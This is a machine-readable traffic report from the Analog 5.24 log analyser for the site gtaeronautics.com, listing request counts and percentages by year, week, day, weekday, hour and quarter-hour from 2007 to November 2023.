x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2023	11	06	01	59
x	FR	2007	12	18	17	05
x	LR	2023	11	05	04	46
x	E7	2023	11	06	01	59
x	SR	1491607
x	S7	9669
x	NC	543354
x	C7	0
x	FL	548342
x	F7	577
x	RR	218
x	R7	0
x	NH	106142
x	H7	424
x	BT	57520368399
x	B7	0
1	Rr	398609	26.723	2023
1	Rr	82334	5.520	2022
1	Rr	98917	6.632	2021
1	Rr	89380	5.992	2020
1	Rr	80088	5.369	2019
1	Rr	68927	4.621	2018
1	Rr	60168	4.034	2017
1	Rr	73316	4.915	2016
1	Rr	80796	5.417	2015
1	Rr	110773	7.426	2014
1	Rr	65173	4.369	2013
1	Rr	60742	4.072	2012
1	Rr	57015	3.822	2011
1	Rr	22139	1.484	2010
1	Rr	69710	4.673	2009
1	Rr	71820	4.815	2008
1	Rr	1700	0.114	2007
1	*BT	R	398609	2023
W	Rr	1250	0.084	2015	10	25
W	Rr	1366	0.092	2015	10	18
W	Rr	1367	0.092	2015	10	11
W	Rr	1214	0.081	2015	10	04
W	Rr	1152	0.077	2015	09	27
W	Rr	1387	0.093	2015	09	20
W	Rr	1655	0.111	2015	09	13
W	Rr	1526	0.102	2015	09	06
W	Rr	1242	0.083	2015	08	30
W	Rr	1800	0.121	2015	08	23
W	Rr	1527	0.102	2015	08	16
W	Rr	1386	0.093	2015	08	09
W	Rr	1593	0.107	2015	08	02
W	Rr	1567	0.105	2015	07	26
W	Rr	1980	0.133	2015	07	19
W	Rr	2180	0.146	2015	07	12
W	Rr	2008	0.135	2015	07	05
W	Rr	2297	0.154	2015	06	28
W	Rr	1556	0.104	2015	06	21
W	Rr	1380	0.093	2015	06	14
W	Rr	2013	0.135	2015	06	07
W	Rr	1651	0.111	2015	05	31
W	Rr	1224	0.082	2015	05	24
W	Rr	1355	0.091	2015	05	17
W	Rr	1179	0.079	2015	05	10
W	Rr	1436	0.096	2015	05	03
W	Rr	1671	0.112	2015	04	26
W	Rr	1878	0.126	2015	04	19
W	Rr	2326	0.156	2015	04	12
W	Rr	2636	0.177	2015	04	05
W	Rr	2297	0.154	2015	03	29
W	Rr	1237	0.083	2015	03	22
W	Rr	1453	0.097	2015	03	15
W	Rr	1399	0.094	2015	03	08
W	Rr	1287	0.086	2015	03	01
W	Rr	1249	0.084	2015	02	22
W	Rr	1373	0.092	2015	02	15
W	Rr	1790	0.120	2015	02	08
W	Rr	1672	0.112	2015	02	01
W	Rr	1543	0.103	2015	01	25
W	Rr	1463	0.098	2015	01	18
W	Rr	1696	0.114	2015	01	11
W	Rr	1707	0.114	2015	01	04
W	Rr	1833	0.123	2014	12	28
W	Rr	1335	0.090	2014	12	21
W	Rr	1644	0.110	2014	12	14
W	Rr	1541	0.103	2014	12	07
W	Rr	1335	0.090	2014	11	30
W	Rr	1262	0.085	2014	11	23
W	Rr	2009	0.135	2014	11	16
W	Rr	1566	0.105	2014	11	09
W	Rr	1814	0.122	2014	11	02
W	Rr	1452	0.097	2014	10	26
W	Rr	1642	0.110	2014	10	19
W	Rr	1795	0.120	2014	10	12
W	Rr	1836	0.123	2014	10	05
W	Rr	1662	0.111	2014	09	28
W	Rr	1843	0.124	2014	09	21
W	Rr	1678	0.112	2014	09	14
W	Rr	1598	0.107	2014	09	07
W	Rr	1418	0.095	2014	08	31
W	Rr	1584	0.106	2014	08	24
W	Rr	1571	0.105	2014	08	17
W	Rr	1727	0.116	2014	08	10
W	Rr	1927	0.129	2014	08	03
W	Rr	1691	0.113	2014	07	27
W	Rr	1702	0.114	2014	07	20
W	Rr	1624	0.109	2014	07	13
W	Rr	1831	0.123	2014	07	06
W	Rr	1867	0.125	2014	06	29
W	Rr	1927	0.129	2014	06	22
W	Rr	2134	0.143	2014	06	15
W	Rr	4851	0.325	2014	06	08
W	Rr	2293	0.154	2014	06	01
W	Rr	3180	0.213	2014	05	25
W	Rr	1468	0.098	2014	05	18
W	Rr	1808	0.121	2014	05	11
W	Rr	1998	0.134	2014	05	04
W	Rr	1876	0.126	2014	04	27
W	Rr	2330	0.156	2014	04	20
W	Rr	2565	0.172	2014	04	13
W	Rr	2652	0.178	2014	04	06
W	Rr	2574	0.173	2014	03	30
W	Rr	1186	0.080	2014	03	23
W	Rr	1305	0.087	2014	03	16
W	Rr	2273	0.152	2014	03	09
W	Rr	2231	0.150	2014	03	02
W	Rr	1925	0.129	2014	02	23
W	Rr	7060	0.473	2014	02	16
W	Rr	2854	0.191	2014	02	09
W	Rr	3190	0.214	2014	02	02
W	Rr	3743	0.251	2014	01	26
W	Rr	3643	0.244	2014	01	19
W	Rr	2961	0.199	2014	01	12
W	Rr	2319	0.155	2014	01	05
W	Rr	981	0.066	2013	12	29
W	Rr	1108	0.074	2013	12	22
W	Rr	1226	0.082	2013	12	15
W	Rr	1285	0.086	2013	12	08
W	Rr	1289	0.086	2013	12	01
W	Rr	1404	0.094	2013	11	24
W	Rr	1142	0.077	2013	11	17
W	Rr	1334	0.089	2013	11	10
W	Rr	1277	0.086	2013	11	03
W	Rr	1035	0.069	2013	10	27
W	Rr	1309	0.088	2013	10	20
W	Rr	1302	0.087	2013	10	13
W	Rr	1432	0.096	2013	10	06
W	Rr	1178	0.079	2013	09	29
W	Rr	947	0.063	2013	09	22
W	Rr	1254	0.084	2013	09	15
W	Rr	1099	0.074	2013	09	08
W	Rr	1053	0.071	2013	09	01
W	Rr	1010	0.068	2013	08	25
W	Rr	1102	0.074	2013	08	18
W	Rr	1063	0.071	2013	08	11
W	Rr	1105	0.074	2013	08	04
W	Rr	1377	0.092	2013	07	28
W	Rr	1498	0.100	2013	07	21
W	Rr	1295	0.087	2013	07	14
W	Rr	1237	0.083	2013	07	07
W	Rr	1003	0.067	2013	06	30
W	Rr	1275	0.085	2013	06	23
W	Rr	1072	0.072	2013	06	16
W	Rr	1249	0.084	2013	06	09
W	Rr	1521	0.102	2013	06	02
W	Rr	1256	0.084	2013	05	26
W	Rr	1091	0.073	2013	05	19
W	Rr	1359	0.091	2013	05	12
W	Rr	1130	0.076	2013	05	05
W	Rr	1215	0.081	2013	04	28
W	Rr	1368	0.092	2013	04	21
W	Rr	1318	0.088	2013	04	14
W	Rr	1408	0.094	2013	04	07
W	Rr	1277	0.086	2013	03	31
W	Rr	1452	0.097	2013	03	24
W	Rr	1418	0.095	2013	03	17
W	Rr	1217	0.082	2013	03	10
W	Rr	1490	0.100	2013	03	03
W	Rr	1353	0.091	2013	02	24
W	Rr	1268	0.085	2013	02	17
W	Rr	1274	0.085	2013	02	10
W	Rr	1153	0.077	2013	02	03
W	Rr	1266	0.085	2013	01	27
W	Rr	1271	0.085	2013	01	20
W	Rr	1449	0.097	2013	01	13
W	Rr	1253	0.084	2013	01	06
W	Rr	1309	0.088	2012	12	30
W	Rr	1156	0.078	2012	12	23
W	Rr	1336	0.090	2012	12	16
W	Rr	1575	0.106	2012	12	09
W	Rr	1087	0.073	2012	12	02
W	Rr	1376	0.092	2012	11	25
W	Rr	1136	0.076	2012	11	18
W	Rr	1341	0.090	2012	11	11
W	Rr	1418	0.095	2012	11	04
W	Rr	1103	0.074	2012	10	28
W	Rr	1200	0.080	2012	10	21
W	Rr	1382	0.093	2012	10	14
W	Rr	1127	0.076	2012	10	07
W	Rr	1187	0.080	2012	09	30
W	Rr	1172	0.079	2012	09	23
W	Rr	1034	0.069	2012	09	16
W	Rr	944	0.063	2012	09	09
W	Rr	958	0.064	2012	09	02
W	Rr	734	0.049	2012	08	26
W	Rr	881	0.059	2012	08	19
W	Rr	874	0.059	2012	08	12
W	Rr	973	0.065	2012	08	05
W	Rr	1010	0.068	2012	07	29
W	Rr	943	0.063	2012	07	22
W	Rr	1089	0.073	2012	07	15
W	Rr	888	0.060	2012	07	08
W	Rr	845	0.057	2012	07	01
W	Rr	1070	0.072	2012	06	24
W	Rr	1050	0.070	2012	06	17
W	Rr	1271	0.085	2012	06	10
W	Rr	957	0.064	2012	06	03
W	Rr	1249	0.084	2012	05	27
W	Rr	1055	0.071	2012	05	20
W	Rr	1392	0.093	2012	05	13
W	Rr	1140	0.076	2012	05	06
W	Rr	1807	0.121	2012	04	29
W	Rr	1225	0.082	2012	04	22
W	Rr	1264	0.085	2012	04	15
W	Rr	1075	0.072	2012	04	08
W	Rr	1261	0.085	2012	04	01
W	Rr	1345	0.090	2012	03	25
W	Rr	1254	0.084	2012	03	18
W	Rr	1478	0.099	2012	03	11
W	Rr	1503	0.101	2012	03	04
W	Rr	1532	0.103	2012	02	26
W	Rr	1464	0.098	2012	02	19
W	Rr	1154	0.077	2012	02	12
W	Rr	1240	0.083	2012	02	05
W	Rr	1088	0.073	2012	01	29
W	Rr	1125	0.075	2012	01	22
W	Rr	60	0.004	2012	01	15
W	Rr	1472	0.099	2012	01	08
W	Rr	1122	0.075	2012	01	01
W	Rr	888	0.060	2011	12	25
W	Rr	1360	0.091	2011	12	18
W	Rr	1486	0.100	2011	12	11
W	Rr	1330	0.089	2011	12	04
W	Rr	1094	0.073	2011	11	27
W	Rr	1062	0.071	2011	11	20
W	Rr	1123	0.075	2011	11	13
W	Rr	975	0.065	2011	11	06
W	Rr	1264	0.085	2011	10	30
W	Rr	1140	0.076	2011	10	23
W	Rr	1211	0.081	2011	10	16
W	Rr	1236	0.083	2011	10	09
W	Rr	1128	0.076	2011	10	02
W	Rr	1083	0.073	2011	09	25
W	Rr	1451	0.097	2011	09	18
W	Rr	1278	0.086	2011	09	11
W	Rr	1219	0.082	2011	09	04
W	Rr	1316	0.088	2011	08	28
W	Rr	1119	0.075	2011	08	21
W	Rr	1484	0.099	2011	08	14
W	Rr	1671	0.112	2011	08	07
W	Rr	1319	0.088	2011	07	31
W	Rr	1197	0.080	2011	07	24
W	Rr	1504	0.101	2011	07	17
W	Rr	1367	0.092	2011	07	10
W	Rr	1205	0.081	2011	07	03
W	Rr	1333	0.089	2011	06	26
W	Rr	1059	0.071	2011	06	19
W	Rr	1353	0.091	2011	06	12
W	Rr	1275	0.085	2011	06	05
W	Rr	983	0.066	2011	05	29
W	Rr	1262	0.085	2011	05	22
W	Rr	1374	0.092	2011	05	15
W	Rr	1076	0.072	2011	05	08
W	Rr	0	0.000	2011	05	01
W	Rr	0	0.000	2011	04	24
W	Rr	0	0.000	2011	04	17
W	Rr	0	0.000	2011	04	10
W	Rr	0	0.000	2011	04	03
W	Rr	0	0.000	2011	03	27
W	Rr	24	0.002	2011	03	20
W	Rr	1317	0.088	2011	03	13
W	Rr	1258	0.084	2011	03	06
W	Rr	1372	0.092	2011	02	27
W	Rr	1226	0.082	2011	02	20
W	Rr	1524	0.102	2011	02	13
W	Rr	1366	0.092	2011	02	06
W	Rr	958	0.064	2011	01	30
W	Rr	1273	0.085	2011	01	23
W	Rr	1560	0.105	2011	01	16
W	Rr	1472	0.099	2011	01	09
W	Rr	1310	0.088	2011	01	02
W	Rr	798	0.053	2010	12	26
W	Rr	935	0.063	2010	12	19
W	Rr	0	0.000	2010	12	12
W	Rr	0	0.000	2010	12	05
W	Rr	0	0.000	2010	11	28
W	Rr	0	0.000	2010	11	21
W	Rr	0	0.000	2010	11	14
W	Rr	0	0.000	2010	11	07
W	Rr	0	0.000	2010	10	31
W	Rr	0	0.000	2010	10	24
W	Rr	0	0.000	2010	10	17
W	Rr	0	0.000	2010	10	10
W	Rr	0	0.000	2010	10	03
W	Rr	0	0.000	2010	09	26
W	Rr	0	0.000	2010	09	19
W	Rr	0	0.000	2010	09	12
W	Rr	0	0.000	2010	09	05
W	Rr	0	0.000	2010	08	29
W	Rr	0	0.000	2010	08	22
W	Rr	0	0.000	2010	08	15
W	Rr	0	0.000	2010	08	08
W	Rr	0	0.000	2010	08	01
W	Rr	0	0.000	2010	07	25
W	Rr	0	0.000	2010	07	18
W	Rr	0	0.000	2010	07	11
W	Rr	0	0.000	2010	07	04
W	Rr	15	0.001	2010	06	27
W	Rr	914	0.061	2010	06	20
W	Rr	1104	0.074	2010	06	13
W	Rr	1096	0.073	2010	06	06
W	Rr	1171	0.079	2010	05	30
W	Rr	1115	0.075	2010	05	23
W	Rr	1170	0.078	2010	05	16
W	Rr	1334	0.089	2010	05	09
W	Rr	1109	0.074	2010	05	02
W	Rr	1067	0.072	2010	04	25
W	Rr	1212	0.081	2010	04	18
W	Rr	1054	0.071	2010	04	11
W	Rr	1325	0.089	2010	04	04
W	Rr	811	0.054	2010	03	28
W	Rr	1195	0.080	2010	03	21
W	Rr	1338	0.090	2010	03	14
W	Rr	1113	0.075	2010	03	07
W	Rr	1103	0.074	2010	02	28
W	Rr	1290	0.086	2010	02	21
W	Rr	0	0.000	2010	02	14
W	Rr	0	0.000	2010	02	07
W	Rr	0	0.000	2010	01	31
W	Rr	0	0.000	2010	01	24
W	Rr	0	0.000	2010	01	17
W	Rr	0	0.000	2010	01	10
W	Rr	0	0.000	2010	01	03
W	Rr	78	0.005	2009	12	27
W	Rr	945	0.063	2009	12	20
W	Rr	1140	0.076	2009	12	13
W	Rr	1323	0.089	2009	12	06
W	Rr	1518	0.102	2009	11	29
W	Rr	1352	0.091	2009	11	22
W	Rr	1346	0.090	2009	11	15
W	Rr	1416	0.095	2009	11	08
W	Rr	1734	0.116	2009	11	01
W	Rr	1035	0.069	2009	10	25
W	Rr	1297	0.087	2009	10	18
W	Rr	1267	0.085	2009	10	11
W	Rr	1440	0.097	2009	10	04
W	Rr	1521	0.102	2009	09	27
W	Rr	1121	0.075	2009	09	20
W	Rr	875	0.059	2009	09	13
W	Rr	1032	0.069	2009	09	06
W	Rr	1283	0.086	2009	08	30
W	Rr	1214	0.081	2009	08	23
W	Rr	1402	0.094	2009	08	16
W	Rr	1260	0.084	2009	08	09
W	Rr	1404	0.094	2009	08	02
W	Rr	1380	0.093	2009	07	26
W	Rr	1470	0.099	2009	07	19
W	Rr	1750	0.117	2009	07	12
W	Rr	1847	0.124	2009	07	05
W	Rr	1889	0.127	2009	06	28
W	Rr	1312	0.088	2009	06	21
W	Rr	1093	0.073	2009	06	14
W	Rr	1363	0.091	2009	06	07
W	Rr	1251	0.084	2009	05	31
W	Rr	1352	0.091	2009	05	24
W	Rr	1133	0.076	2009	05	17
W	Rr	1887	0.127	2009	05	10
W	Rr	1369	0.092	2009	05	03
W	Rr	1089	0.073	2009	04	26
W	Rr	1160	0.078	2009	04	19
W	Rr	1189	0.080	2009	04	12
W	Rr	1529	0.103	2009	04	05
W	Rr	1155	0.077	2009	03	29
W	Rr	1230	0.082	2009	03	22
W	Rr	1029	0.069	2009	03	15
W	Rr	1234	0.083	2009	03	08
W	Rr	1486	0.100	2009	03	01
W	Rr	1470	0.099	2009	02	22
W	Rr	1198	0.080	2009	02	15
W	Rr	1802	0.121	2009	02	08
W	Rr	1653	0.111	2009	02	01
W	Rr	1346	0.090	2009	01	25
W	Rr	1431	0.096	2009	01	18
W	Rr	1678	0.112	2009	01	11
W	Rr	1591	0.107	2009	01	04
W	Rr	886	0.059	2008	12	28
W	Rr	1148	0.077	2008	12	21
W	Rr	1428	0.096	2008	12	14
W	Rr	1508	0.101	2008	12	07
W	Rr	1194	0.080	2008	11	30
W	Rr	1070	0.072	2008	11	23
W	Rr	1396	0.094	2008	11	16
W	Rr	1255	0.084	2008	11	09
W	Rr	1314	0.088	2008	11	02
W	Rr	1397	0.094	2008	10	26
W	Rr	1638	0.110	2008	10	19
W	Rr	1298	0.087	2008	10	12
W	Rr	430	0.029	2008	10	05
W	Rr	723	0.048	2008	09	28
W	Rr	1308	0.088	2008	09	21
W	Rr	1242	0.083	2008	09	14
W	Rr	1409	0.094	2008	09	07
W	Rr	1142	0.077	2008	08	31
W	Rr	1022	0.069	2008	08	24
W	Rr	1062	0.071	2008	08	17
W	Rr	1188	0.080	2008	08	10
W	Rr	1232	0.083	2008	08	03
W	Rr	1050	0.070	2008	07	27
W	Rr	1272	0.085	2008	07	20
W	Rr	1305	0.087	2008	07	13
W	Rr	1093	0.073	2008	07	06
W	Rr	1182	0.079	2008	06	29
W	Rr	1937	0.130	2008	06	22
W	Rr	1493	0.100	2008	06	15
W	Rr	1083	0.073	2008	06	08
W	Rr	1283	0.086	2008	06	01
W	Rr	1432	0.096	2008	05	25
W	Rr	1726	0.116	2008	05	18
W	Rr	1580	0.106	2008	05	11
W	Rr	2661	0.178	2008	05	04
W	Rr	3648	0.245	2008	04	27
W	Rr	1400	0.094	2008	04	20
W	Rr	1365	0.092	2008	04	13
W	Rr	1213	0.081	2008	04	06
W	Rr	1670	0.112	2008	03	30
W	Rr	1211	0.081	2008	03	23
W	Rr	1144	0.077	2008	03	16
W	Rr	1301	0.087	2008	03	09
W	Rr	1292	0.087	2008	03	02
W	Rr	1427	0.096	2008	02	24
W	Rr	2207	0.148	2008	02	17
W	Rr	1124	0.075	2008	02	10
W	Rr	1561	0.105	2008	02	03
W	Rr	1533	0.103	2008	01	27
W	Rr	1389	0.093	2008	01	20
W	Rr	1133	0.076	2008	01	13
W	Rr	1404	0.094	2008	01	06
W	Rr	976	0.065	2007	12	30
W	Rr	801	0.054	2007	12	23
W	Rr	675	0.045	2007	12	16
W	*BT	R	17181	2023	05	07
D	Rr	74	0.005	2023	11	05
D	Rr	312	0.021	2023	11	04
D	Rr	502	0.034	2023	11	03
D	Rr	1711	0.115	2023	11	02
D	Rr	991	0.066	2023	11	01
D	Rr	3415	0.229	2023	10	31
D	Rr	2706	0.181	2023	10	30
D	Rr	1530	0.103	2023	10	29
D	Rr	2154	0.144	2023	10	28
D	Rr	1506	0.101	2023	10	27
D	Rr	2322	0.156	2023	10	26
D	Rr	2412	0.162	2023	10	25
D	Rr	1416	0.095	2023	10	24
D	Rr	2934	0.197	2023	10	23
D	Rr	1236	0.083	2023	10	22
D	Rr	1950	0.131	2023	10	21
D	Rr	1596	0.107	2023	10	20
D	Rr	2478	0.166	2023	10	19
D	Rr	2616	0.175	2023	10	18
D	Rr	1662	0.111	2023	10	17
D	Rr	3420	0.229	2023	10	16
D	Rr	1728	0.116	2023	10	15
D	Rr	2646	0.177	2023	10	14
D	Rr	2742	0.184	2023	10	13
D	Rr	1494	0.100	2023	10	12
D	Rr	1676	0.112	2023	10	11
D	Rr	1910	0.128	2023	10	10
D	Rr	2170	0.145	2023	10	09
D	Rr	2075	0.139	2023	10	08
D	Rr	1455	0.098	2023	10	07
D	Rr	1500	0.101	2023	10	06
D	Rr	2042	0.137	2023	10	05
D	Rr	3672	0.246	2023	10	04
D	Rr	2748	0.184	2023	10	03
D	Rr	1320	0.088	2023	10	02
D	Rr	1548	0.104	2023	10	01
D	Rr	1686	0.113	2023	09	30
D	Rr	3432	0.230	2023	09	29
D	Rr	2448	0.164	2023	09	28
D	Rr	1500	0.101	2023	09	27
D	Rr	2460	0.165	2023	09	26
D	Rr	1368	0.092	2023	09	25
D	*BT	R	5220	2023	05	08
d	Rr	175107	11.739	Sun
d	Rr	241632	16.199	Mon
d	Rr	241591	16.197	Tue
d	Rr	246984	16.558	Wed
d	Rr	238916	16.017	Thu
d	Rr	227779	15.271	Fri
d	Rr	119598	8.018	Sat
H	Rr	34	0.002	2023	11	05	04
H	Rr	22	0.001	2023	11	05	03
H	Rr	4	0.000	2023	11	05	02
H	Rr	5	0.000	2023	11	05	01
H	Rr	9	0.001	2023	11	05	00
H	Rr	11	0.001	2023	11	04	23
H	Rr	8	0.001	2023	11	04	22
H	Rr	20	0.001	2023	11	04	21
H	Rr	37	0.002	2023	11	04	20
H	Rr	15	0.001	2023	11	04	19
H	Rr	10	0.001	2023	11	04	18
H	Rr	17	0.001	2023	11	04	17
H	Rr	12	0.001	2023	11	04	16
H	Rr	11	0.001	2023	11	04	15
H	Rr	26	0.002	2023	11	04	14
H	Rr	3	0.000	2023	11	04	13
H	Rr	6	0.000	2023	11	04	12
H	Rr	28	0.002	2023	11	04	11
H	Rr	13	0.001	2023	11	04	10
H	Rr	13	0.001	2023	11	04	09
H	Rr	8	0.001	2023	11	04	08
H	Rr	4	0.000	2023	11	04	07
H	Rr	11	0.001	2023	11	04	06
H	Rr	1	0.000	2023	11	04	05
H	Rr	22	0.001	2023	11	04	04
H	Rr	12	0.001	2023	11	04	03
H	Rr	18	0.001	2023	11	04	02
H	Rr	6	0.000	2023	11	04	01
H	Rr	0	0.000	2023	11	04	00
H	Rr	44	0.003	2023	11	03	23
H	Rr	8	0.001	2023	11	03	22
H	Rr	14	0.001	2023	11	03	21
H	Rr	2	0.000	2023	11	03	20
H	Rr	30	0.002	2023	11	03	19
H	Rr	18	0.001	2023	11	03	18
H	Rr	4	0.000	2023	11	03	17
H	Rr	10	0.001	2023	11	03	16
H	Rr	16	0.001	2023	11	03	15
H	Rr	64	0.004	2023	11	03	14
H	Rr	22	0.001	2023	11	03	13
H	Rr	10	0.001	2023	11	03	12
H	Rr	2	0.000	2023	11	03	11
H	Rr	8	0.001	2023	11	03	10
H	Rr	2	0.000	2023	11	03	09
H	Rr	70	0.005	2023	11	03	08
H	Rr	16	0.001	2023	11	03	07
H	Rr	2	0.000	2023	11	03	06
H	Rr	58	0.004	2023	11	03	05
H	Rr	9	0.001	2023	11	03	04
H	Rr	33	0.002	2023	11	03	03
H	Rr	33	0.002	2023	11	03	02
H	Rr	9	0.001	2023	11	03	01
H	Rr	18	0.001	2023	11	03	00
H	Rr	39	0.003	2023	11	02	23
H	Rr	51	0.003	2023	11	02	22
H	Rr	21	0.001	2023	11	02	21
H	Rr	15	0.001	2023	11	02	20
H	Rr	24	0.002	2023	11	02	19
H	Rr	15	0.001	2023	11	02	18
H	Rr	186	0.012	2023	11	02	17
H	Rr	180	0.012	2023	11	02	16
H	Rr	138	0.009	2023	11	02	15
H	Rr	234	0.016	2023	11	02	14
H	Rr	18	0.001	2023	11	02	13
H	Rr	54	0.004	2023	11	02	12
H	Rr	6	0.000	2023	11	02	11
H	Rr	15	0.001	2023	11	02	10
H	Rr	21	0.001	2023	11	02	09
H	Rr	24	0.002	2023	11	02	08
H	Rr	24	0.002	2023	11	02	07
H	Rr	255	0.017	2023	11	02	06
H	Rr	87	0.006	2023	11	02	05
H	*BT	R	1225	2023	05	08	18
h	Rr	56919	3.816	00
h	Rr	56500	3.788	01
h	Rr	56910	3.815	02
h	Rr	59891	4.015	03
h	Rr	56936	3.817	04
h	Rr	53423	3.582	05
h	Rr	50853	3.409	06
h	Rr	51561	3.457	07
h	Rr	48516	3.253	08
h	Rr	45562	3.055	09
h	Rr	49160	3.296	10
h	Rr	53264	3.571	11
h	Rr	53509	3.587	12
h	Rr	57972	3.887	13
h	Rr	70365	4.717	14
h	Rr	74882	5.020	15
h	Rr	79885	5.356	16
h	Rr	83953	5.628	17
h	Rr	79510	5.330	18
h	Rr	79349	5.320	19
h	Rr	75169	5.039	20
h	Rr	71177	4.772	21
h	Rr	64297	4.311	22
h	Rr	62044	4.160	23
4	Rr	1	0.000	2023	11	05	04	45
4	Rr	0	0.000	2023	11	05	04	30
4	Rr	2	0.000	2023	11	05	04	15
4	Rr	31	0.002	2023	11	05	04	00
4	Rr	2	0.000	2023	11	05	03	45
4	Rr	13	0.001	2023	11	05	03	30
4	Rr	3	0.000	2023	11	05	03	15
4	Rr	4	0.000	2023	11	05	03	00
4	Rr	3	0.000	2023	11	05	02	45
4	Rr	0	0.000	2023	11	05	02	30
4	Rr	0	0.000	2023	11	05	02	15
4	Rr	1	0.000	2023	11	05	02	00
4	Rr	1	0.000	2023	11	05	01	45
4	Rr	1	0.000	2023	11	05	01	30
4	Rr	2	0.000	2023	11	05	01	15
4	Rr	1	0.000	2023	11	05	01	00
4	Rr	2	0.000	2023	11	05	00	45
4	Rr	2	0.000	2023	11	05	00	30
4	Rr	2	0.000	2023	11	05	00	15
4	Rr	3	0.000	2023	11	05	00	00
4	Rr	0	0.000	2023	11	04	23	45
4	Rr	3	0.000	2023	11	04	23	30
4	Rr	4	0.000	2023	11	04	23	15
4	Rr	4	0.000	2023	11	04	23	00
4	Rr	2	0.000	2023	11	04	22	45
4	Rr	1	0.000	2023	11	04	22	30
4	Rr	5	0.000	2023	11	04	22	15
4	Rr	0	0.000	2023	11	04	22	00
4	Rr	9	0.001	2023	11	04	21	45
4	Rr	6	0.000	2023	11	04	21	30
4	Rr	3	0.000	2023	11	04	21	15
4	Rr	2	0.000	2023	11	04	21	00
4	Rr	31	0.002	2023	11	04	20	45
4	Rr	0	0.000	2023	11	04	20	30
4	Rr	4	0.000	2023	11	04	20	15
4	Rr	2	0.000	2023	11	04	20	00
4	Rr	5	0.000	2023	11	04	19	45
4	Rr	3	0.000	2023	11	04	19	30
4	Rr	4	0.000	2023	11	04	19	15
4	Rr	3	0.000	2023	11	04	19	00
4	Rr	3	0.000	2023	11	04	18	45
4	Rr	2	0.000	2023	11	04	18	30
4	Rr	2	0.000	2023	11	04	18	15
4	Rr	3	0.000	2023	11	04	18	00
4	Rr	3	0.000	2023	11	04	17	45
4	Rr	3	0.000	2023	11	04	17	30
4	Rr	9	0.001	2023	11	04	17	15
4	Rr	2	0.000	2023	11	04	17	00
4	Rr	3	0.000	2023	11	04	16	45
4	Rr	2	0.000	2023	11	04	16	30
4	Rr	5	0.000	2023	11	04	16	15
4	Rr	2	0.000	2023	11	04	16	00
4	Rr	3	0.000	2023	11	04	15	45
4	Rr	2	0.000	2023	11	04	15	30
4	Rr	3	0.000	2023	11	04	15	15
4	Rr	3	0.000	2023	11	04	15	00
4	Rr	3	0.000	2023	11	04	14	45
4	Rr	12	0.001	2023	11	04	14	30
4	Rr	10	0.001	2023	11	04	14	15
4	Rr	1	0.000	2023	11	04	14	00
4	Rr	0	0.000	2023	11	04	13	45
4	Rr	1	0.000	2023	11	04	13	30
4	Rr	1	0.000	2023	11	04	13	15
4	Rr	1	0.000	2023	11	04	13	00
4	Rr	5	0.000	2023	11	04	12	45
4	Rr	0	0.000	2023	11	04	12	30
4	Rr	1	0.000	2023	11	04	12	15
4	Rr	0	0.000	2023	11	04	12	00
4	Rr	21	0.001	2023	11	04	11	45
4	Rr	1	0.000	2023	11	04	11	30
4	Rr	5	0.000	2023	11	04	11	15
4	Rr	1	0.000	2023	11	04	11	00
4	Rr	4	0.000	2023	11	04	10	45
4	Rr	7	0.000	2023	11	04	10	30
4	Rr	0	0.000	2023	11	04	10	15
4	Rr	2	0.000	2023	11	04	10	00
4	Rr	1	0.000	2023	11	04	09	45
4	Rr	3	0.000	2023	11	04	09	30
4	Rr	2	0.000	2023	11	04	09	15
4	Rr	7	0.000	2023	11	04	09	00
4	Rr	2	0.000	2023	11	04	08	45
4	Rr	4	0.000	2023	11	04	08	30
4	Rr	0	0.000	2023	11	04	08	15
4	Rr	2	0.000	2023	11	04	08	00
4	Rr	0	0.000	2023	11	04	07	45
4	Rr	0	0.000	2023	11	04	07	30
4	Rr	4	0.000	2023	11	04	07	15
4	Rr	0	0.000	2023	11	04	07	00
4	Rr	4	0.000	2023	11	04	06	45
4	Rr	1	0.000	2023	11	04	06	30
4	Rr	6	0.000	2023	11	04	06	15
4	Rr	0	0.000	2023	11	04	06	00
4	Rr	0	0.000	2023	11	04	05	45
4	Rr	0	0.000	2023	11	04	05	30
4	Rr	1	0.000	2023	11	04	05	15
4	Rr	0	0.000	2023	11	04	05	00
4	*BT	R	975	2023	05	08	18	00
6	Rr	13689	0.918	00	00
6	Rr	13900	0.932	00	15
6	Rr	14563	0.976	00	30
6	Rr	14767	0.990	00	45
6	Rr	13126	0.880	01	00
6	Rr	14712	0.986	01	15
6	Rr	13874	0.930	01	30
6	Rr	14788	0.991	01	45
6	Rr	13056	0.875	02	00
6	Rr	14474	0.970	02	15
6	Rr	14993	1.005	02	30
6	Rr	14387	0.965	02	45
6	Rr	14549	0.975	03	00
6	Rr	13913	0.933	03	15
6	Rr	14195	0.952	03	30
